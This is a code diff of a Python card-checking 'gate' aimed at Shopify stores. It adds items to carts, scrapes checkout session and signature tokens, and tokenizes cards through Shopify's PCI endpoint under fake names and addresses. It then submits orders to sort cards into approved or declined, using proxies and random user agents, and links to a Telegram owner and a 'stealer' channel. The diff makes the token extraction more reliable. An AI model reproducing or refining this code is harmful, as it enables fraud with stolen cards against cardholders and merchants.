@@ -23,13 +23,13 @@ GATE_NAME = "Shopify - Auto 💸"
 MAX_MSC_LIMIT = 10
 MAX_TSC_LIMIT = 100
 # Change this to your target Shopify store (without https://)
-DEFAULT_SHOPIFY_SITE = "vicegripgarage.com"
+DEFAULT_SHOPIFY_SITE = "store.myshopify.com"
 
 OWNER_DM = "https://t.me/spid_3r"
 SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
 STEALER_CHANNEL_ID = -1003627495953
 
-# ========== HELPER FUNCTIONS (original) ==========
+# ========== HELPER FUNCTIONS ==========
 def random_string(length):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
 
@@ -78,7 +78,7 @@ def create_proxy_session(proxy_str=None):
     session.mount('https://', adapter)
     return session
 
-# ========== CORE SHOPIFY FUNCTIONS (synchronous) ==========
+# ========== CORE SHOPIFY FUNCTIONS (synchronous, with improved token extraction) ==========
 def find_cheapest_product(site):
     session = create_proxy_session()
     session.headers.update({"User-Agent": random_ua()})
@@ -108,12 +108,14 @@ def create_checkout_session(site, variant_id, product_handle):
     session = create_proxy_session()
     session.headers.update({"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"})
     try:
+        # Add to cart
         headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}', 'user-agent': ua}
         resp = session.post(f'https://{site}/cart/add.js', headers=headers, json={'items': [{'id': int(variant_id), 'quantity': 1}]}, timeout=30)
         if resp.status_code != 200:
             resp = session.post(f'https://{site}/cart/add', data={'id': str(variant_id), 'quantity': '1'}, timeout=30)
             if resp.status_code != 200:
                 return None, 'ERROR', 'ADD_TO_CART_FAILED'
+        # Go to checkout
         resp = session.post(f'https://{site}/cart', data={'updates[]': '1', 'checkout': ''}, allow_redirects=True, timeout=30)
         if 'checkout' not in resp.url:
             return None, 'ERROR', 'CHECKOUT_REDIRECT_FAILED'
@@ -124,6 +126,8 @@ def create_checkout_session(site, variant_id, product_handle):
             return None, 'VERIFY', 'VERIFY_BROWSER'
         if 'access denied' in lower:
             return None, 'BLOCKED', 'ACCESS_DENIED'
+        
+        # Extract signature (caller identification)
         sig_patterns = [
             r'checkoutCardsinkCallerIdentificationSignature[&quot;:]+([^&"]+)',
             r'"checkoutCardsinkCallerIdentificationSignature"\s*:\s*"([^"]+)"',
@@ -139,18 +143,71 @@ def create_checkout_session(site, variant_id, product_handle):
                 shopify_sig = None
         if not shopify_sig:
             return None, 'ERROR', 'NO_SIGNATURE'
+        
+        # Extract session token (improved)
+        session_token = None
+        # Method 1: meta tag
         m = re.search(r'<meta\s+name="serialized-session-token"\s+content="([^"]+)"', checkout_text)
-        session_token = m.group(1).replace('&quot;', '').strip() if m else None
+        if m:
+            session_token = m.group(1).replace('&quot;', '').strip()
+        # Method 2: JavaScript variable
+        if not session_token:
+            m = re.search(r'window\.__INITIAL_STATE__\s*=\s*({.*?});', checkout_text, re.DOTALL)
+            if m:
+                try:
+                    data = json.loads(m.group(1))
+                    session_token = data.get('sessionToken') or data.get('serializedSessionToken')
+                except:
+                    pass
+        # Method 3: simple regex for "sessionToken":"..."
+        if not session_token:
+            m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', checkout_text)
+            if m:
+                session_token = m.group(1)
+        # Method 4: from the checkout URL (sometimes it's in the URL)
+        if not session_token:
+            m = re.search(r'/checkouts/cn/([^/?]+)', checkout_resp.url)
+            if m:
+                session_token = m.group(1)
+        if not session_token:
+            return None, 'ERROR', 'SESSION_TOKEN_MISSING'
+        
+        # Extract queue token
+        queue_token = None
         m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', checkout_text)
-        queue_token = m.group(1) if m else None
+        if m:
+            queue_token = m.group(1)
+        
+        # Extract stable ID
+        stable_id = None
         m = re.search(r'"stableId"\s*:\s*"([a-f0-9-]{36})"', checkout_text)
-        stable_id = m.group(1) if m else str(uuid.uuid4())
+        if m:
+            stable_id = m.group(1)
+        if not stable_id:
+            stable_id = str(uuid.uuid4())
+        
+        # Extract checkout source ID (from URL)
         m = re.search(r'/checkouts/cn/([^/]+)/', checkout_resp.url) or re.search(r'/checkouts/([^/]+)/', checkout_resp.url)
         checkout_source_id = m.group(1) if m else ''
+        
+        # Extract build ID (x-checkout-web-build-id)
+        build_id = None
         m = re.search(r'x-checkout-web-build-id[&quot;:]+([a-f0-9]+)', checkout_text)
-        build_id = m.group(1) if m else 'fb347c24d80acb8076f676fa55018bb00cddfde9'
+        if m:
+            build_id = m.group(1)
+        if not build_id:
+            # Try to find in script
+            m = re.search(r'buildId\s*:\s*"([^"]+)"', checkout_text)
+            if m:
+                build_id = m.group(1)
+        # If still not found, we can omit it (some stores don't require it)
+        
+        # Extract payment method identifier
+        payment_method_id = None
         m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([^"]+)"', checkout_text)
-        payment_method_id = m.group(1) if m else None
+        if m:
+            payment_method_id = m.group(1)
+        
         return {
             'site': site, 'session': session, 'ua': ua, 'sig': shopify_sig,
             'session_token': session_token, 'queue_token': queue_token, 'stable_id': stable_id,
@@ -182,6 +239,8 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
         email = f"{first_name.lower()}{last_name.lower()}{random.randint(10,999)}@gmail.com"
         addr = random_address()
         addr['firstName'], addr['lastName'] = first_name, last_name
+        
+        # Tokenize card via PCI endpoint
         pay_session = create_proxy_session()
         pay_headers = {'accept': 'application/json', 'content-type': 'application/json',
                        'origin': 'https://checkout.pci.shopifyinc.com', 'shopify-identification-signature': sig, 'user-agent': ua}
@@ -193,6 +252,8 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
         payment_session_id = resp.json().get('id')
         if not payment_session_id:
             return 'ERROR', 'NO_SESSION_ID', price
+        
+        # Build delivery object
         if require_shipping:
             delivery = {
                 'deliveryLines': [{'destination': {'streetAddress': addr},
@@ -208,13 +269,19 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
                     'deliveryMethodTypes': ['NONE'], 'expectedTotalPrice': {'any': True}, 'destinationChanged': False}],
                 'noDeliveryRequired': [], 'useProgressiveRates': False, 'supportsSplitShipping': True
             }
+        
+        # GraphQL headers
         gql_headers = {'accept': 'application/json', 'content-type': 'application/json', 'origin': f'https://{site}',
-            'referer': checkout_url, 'user-agent': ua, 'x-checkout-one-session-token': session_token or '',
-            'x-checkout-web-build-id': build_id, 'x-checkout-web-source-id': checkout_source_id}
+            'referer': checkout_url, 'user-agent': ua, 'x-checkout-one-session-token': session_token}
+        if build_id:
+            gql_headers['x-checkout-web-build-id'] = build_id
+        if checkout_source_id:
+            gql_headers['x-checkout-web-source-id'] = checkout_source_id
+        
         gql_data = {
             'variables': {
                 'input': {
-                    'sessionInput': {'sessionToken': session_token or ''}, 'queueToken': queue_token or '',
+                    'sessionInput': {'sessionToken': session_token}, 'queueToken': queue_token or '',
                     'delivery': delivery,
                     'merchandise': {'merchandiseLines': [{'stableId': stable_id,
                         'merchandise': {'productVariantReference': {'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
@@ -233,17 +300,24 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
             'operationName': 'SubmitForCompletion',
             'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!){submitForCompletion(input:$input attemptToken:$attemptToken){__typename ...on SubmitSuccess{receipt{...R}}...on SubmitAlreadyAccepted{receipt{...R}}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...R}}}}fragment R on Receipt{__typename ...on ProcessedReceipt{id redirectUrl orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code __typename}}__typename}}'
         }
+        
         resp = session.post(f'https://{site}/checkouts/unstable/graphql', params={'operationName': 'SubmitForCompletion'},
                            headers=gql_headers, json=gql_data, timeout=60)
         if resp.status_code != 200:
             return 'ERROR', f'HTTP_{resp.status_code}', price
+        
         result = resp.json()
         resp_text = resp.text.lower()
+        
         if 'errors' in result:
             err = result['errors'][0].get('message', 'ERROR')[:40]
             if 'delivery' in err.lower() and require_shipping is None:
                 return check_card_sync(checkout_data, card, variant_id, price, require_shipping=True)
+            # If the error is about session token, return specific error
+            if 'session' in err.lower() and 'token' in err.lower():
+                return 'ERROR', 'INVALID_SESSION_TOKEN', price
             return 'ERROR', err, price
+        
         completion = result.get('data', {}).get('submitForCompletion', {})
         if not completion:
             if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
@@ -251,6 +325,7 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
             if 'insufficient' in resp_text:
                 return 'DECLINED', 'INSUFFICIENT_FUNDS', price
             return 'ERROR', 'NO_COMPLETION', price
+        
         typename = completion.get('__typename', '')
         if typename == 'SubmitRejected':
             errors = completion.get('errors', [])
@@ -262,6 +337,7 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
             return 'DECLINED', 'REJECTED', price
         if typename == 'SubmitFailed':
             return 'DECLINED', completion.get('reason', 'FAILED'), price
+        
         receipt = completion.get('receipt', {})
         receipt_type = receipt.get('__typename', '')
         receipt_id = receipt.get('id')
@@ -270,13 +346,14 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
         if receipt_type == 'FailedReceipt':
             err = receipt.get('processingError', {}).get('code', 'FAILED')
             return 'DECLINED', err, price
+        
         if receipt_id and receipt_type in ['ProcessingReceipt', 'WaitingReceipt', '']:
             poll_query = 'query Poll($id:ID!,$token:String!){receipt(receiptId:$id,sessionInput:{sessionToken:$token}){__typename ...on ProcessedReceipt{id orderStatusPageUrl}...on FailedReceipt{processingError{...on PaymentFailed{code}}}}}'
             for _ in range(15):
                 time.sleep(2)
                 try:
                     poll_resp = session.post(f'https://{site}/checkouts/unstable/graphql', headers=gql_headers,
-                        json={'variables': {'id': receipt_id, 'token': session_token or ''}, 'operationName': 'Poll', 'query': poll_query}, timeout=20)
+                        json={'variables': {'id': receipt_id, 'token': session_token}, 'operationName': 'Poll', 'query': poll_query}, timeout=20)
                     if poll_resp.status_code == 200:
                         poll_data = poll_resp.json().get('data', {}).get('receipt', {})
                         poll_type = poll_data.get('__typename', '')
@@ -290,6 +367,7 @@ def check_card_sync(checkout_data, card, variant_id, price, require_shipping=Non
                 except:
                     pass
             return 'ERROR', 'POLL_TIMEOUT', price
+        
         if typename == 'Throttled':
             return 'ERROR', 'THROTTLED', price
         if 'card_declined' in resp_text or 'CARD_DECLINED' in resp.text:
